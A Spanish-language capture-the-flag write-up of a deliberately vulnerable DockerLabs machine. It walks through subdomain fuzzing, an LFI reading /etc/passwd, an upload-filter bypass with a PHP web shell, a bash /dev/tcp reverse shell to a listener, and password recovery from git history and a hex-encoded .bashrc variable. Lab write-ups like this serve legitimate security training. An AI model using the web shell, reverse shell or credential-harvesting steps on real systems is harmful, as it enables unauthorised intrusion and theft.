## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Puerto 3306 : MYSQL

Encuentro un dominio:

```bash
http://realgob.dl
```

No veo mucho y fuzzeo los subdominios:

```bash
fuff -c -w /dirb/big.txt -u http://domain -H “Host: FUZZ.domain” -fw 20
```

Encuentro “desarrollo“.

Es solo un panel pero no hay nada interesante. 

Decido fuzzear los directorios de realgob.dl

```bash
gobuster dir -u URL -w /usr/share/wordlists/dirbuster/directory-list.txt -x php,html,txt,zip
```

Encuentro un “important.txt” que revela que el laboratorio esta hecho para resolverse de muchas maneras. Después de rato probando varias cosas, veo que hay varias paginas php, decido buscar payloads para probar un LFI. 

Después de rato encuentro uno:

```bash
ffuf -u http://realgob.dl/about.php?FUZZ=/etc/passwd -w <WORDLIST> -fs 4939
```

Encuentro el payload “file”

```bash
http://realgob.dl/about.php?file=/etc/passwd
```

Confirmo la vulnerabilidad.

Pero ya había resuelto con esa técnica la máquina y decido buscar otra. 

Tengo también /admin.php:

```bash
User : admin
Pass : admin123
```

Hay un parámetro para subir archivos, intentando una shell.php no deja. Pruebo interceptar la petición y modificar el Content-Type de (application/x-php) a (image/jpeg)

Contenido de la shell:

```bash
<?php
			system($_GET['cmd']);
?>
```

Pruebo:

```bash
http://realgob.dl/uploads/shell.php?cmd=whoami
```

También funciona.

Así que me envío una conexión:

```bash
http://realgob.dl/uploads/shell.php?cmd=bash -c bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/4444 <%261’
```

```bash
nc -nlvp 4444
```

## Escalada  www-data → adm

Intentando conseguir algo MySQL no encuentro nada. Pero en la carpeta /html/desarrollo contiene un git, conociendo que hay git podemos sacar info. 

Primero lo marco como directorio seguro:

```bash
export HOME=/tmp
git log
# Info:
commit e84b3048cf586ad10eb3194025ae9d57dac8b629 (HEAD -> master)
Author: developer <developer@example.com>
Date:   Mon Oct 14 07:47:14 2024 +0000

    Cambios en el panel de login

commit 1e3fe13e662dacb85056691d3afc932c16a1e3df
Author: sysadmin <sysadmin@example.com>
Date:   Mon Oct 14 07:46:57 2024 +0000

    Actualizaci<C3><B3>n de la versi<C3><B3>n de PHP

commit cd04778b50b131f5041bd7f9e6895741d6f4b98b
Author: editor <editor@example.com>
Date:   Mon Oct 14 07:46:43 2024 +0000

    Actualizaci<C3><B3>n de contenido en el panel de noticias

commit 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
Author: adm <adm@example.com>
Date:   Mon Oct 14 07:44:17 2024 +0000

    Acceso a Remote Management

commit 2d5e983bab20c69c2f2ddc75a51720dbe60958e6
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:39:40 2024 +0000

    Registrar actividad sospechosa

commit e562db0b7923041980332e5988d94edf9a5df602
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:39:33 2024 +0000

    Registrar cambio en la configuraci<C3><B3>n del sistema

commit 837bdf4af4514bcdb218733cf21c4c192b87fe91
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:39:27 2024 +0000

    Registrar intento de acceso no autorizado

commit 9a36af726878b68de4f99fffb674ddfbe8c996ed
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:38:17 2024 +0000

    Actualizaci<C3><B3>n de notas y hash de contrase<C3><B1>a

commit a6641dd60da6558616acb478ade407d8351a3e57
Author: Usuario Simulado <usuario.simulado@example.com>
Date:   Mon Oct 14 07:32:29 2024 +0000

    Pago fraudulento reporte
```

Interesa:

```bash
git show 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
# Info:
9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX
```

Nos da la contraseña de adm

## Escalada adm → root

```bash
cat .bashrc
```

Interesa:

```bash
export MY_PASS='64 6f 63 6b 65 72 6c 61 62 73 34 75'
```

Parece la contraseña en hexadecimal, decriptada es:

```bash
echo “64 6f 63 6b 65 72 6c 61 62 73 34 75” | xxd -r -p
dockerlabs4u
```

Listo.
